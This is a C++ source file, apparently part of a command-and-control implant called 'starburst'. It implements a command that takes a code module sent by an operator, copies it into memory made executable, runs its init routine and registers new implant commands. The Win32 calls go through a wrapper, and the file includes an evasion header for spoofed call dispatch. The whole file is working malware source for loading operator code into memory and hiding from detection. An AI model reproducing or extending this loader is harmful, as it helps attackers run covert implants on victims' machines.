#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <evasion/spoof_dispatch.h>

#ifdef INCLUDE_CMD_LOAD

using namespace stardust;
using namespace starburst;

typedef int (*ModuleInitFn)( instance* inst, instance::LoadedCommand* table, int max_commands );

auto declfn starburst::cmd_load(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t module_len = 0;
    auto module_data = parser_bytes( params, &module_len );

    if ( !module_data || module_len <= 4 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no module data provided" ) ) );
        return;
    }

    if ( inst.loaded.module_count >= MAX_LOADED_MODULES ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "max modules loaded" ) ) );
        return;
    }

    uint32_t init_offset = *reinterpret_cast<uint32_t*>( module_data );
    uint8_t* pic_start   = module_data + 4;
    uint32_t pic_len     = module_len - 4;

    if ( init_offset >= pic_len ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid init offset" ) ) );
        return;
    }

    DBG_PRINT( inst, "cmd_load: %u bytes, init_offset=%u sizeof(LC)=%d handler_off=%d active_off=%d\n",
               pic_len, init_offset,
               (int)sizeof(instance::LoadedCommand),
               (int)__builtin_offsetof(instance::LoadedCommand, handler),
               (int)__builtin_offsetof(instance::LoadedCommand, active) );

    LPVOID mem = (LPVOID)SCALL( inst, kernel32.VirtualAlloc,
        nullptr, pic_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( !mem ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualAlloc failed" ) ) );
        return;
    }

    memory::copy( mem, pic_start, pic_len );

    DWORD old_protect = 0;
    SCALL( inst, kernel32.VirtualProtect, mem, pic_len, PAGE_EXECUTE_READ, &old_protect );

    uint32_t slots_available = inst.MAX_LOADED_COMMANDS - inst.loaded.count;
    if ( slots_available == 0 ) {
        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no command slots available" ) ) );
        return;
    }

    auto init_fn = reinterpret_cast<ModuleInitFn>(
        reinterpret_cast<uint8_t*>( mem ) + init_offset );

    int registered = init_fn(
        &inst,
        &inst.loaded.entries[inst.loaded.count],
        static_cast<int>( slots_available ) );

    DBG_PRINT( inst, "cmd_load: init returned %d\n", registered );

    if ( registered <= 0 ) {
        SCALL( inst, kernel32.VirtualFree, mem, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "module init failed" ) ) );
        return;
    }

    /* Dump what module_init wrote BEFORE we touch active */
    for ( int i = 0; i < registered && i < 4; i++ ) {
        auto& e = inst.loaded.entries[inst.loaded.count + i];
        DBG_PRINT( inst, "cmd_load: entry[%d] cmd_id=0x%02x handler=%p active=%d\n",
                   i, (unsigned)e.cmd_id, e.handler, (int)e.active );
    }

    for ( int i = 0; i < registered; i++ ) {
        inst.loaded.entries[inst.loaded.count + i].active = true;
    }

    DBG_PRINT( inst, "cmd_load: after active set, entry[0].handler=%p\n",
               inst.loaded.entries[inst.loaded.count].handler );

    inst.loaded.count += registered;
    inst.loaded.module_bases[inst.loaded.module_count] = mem;
    inst.loaded.module_count++;

    char msg[128] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "loaded module: " ) ) );
    char num[16];
    int_to_str( num, registered, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( " commands registered" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
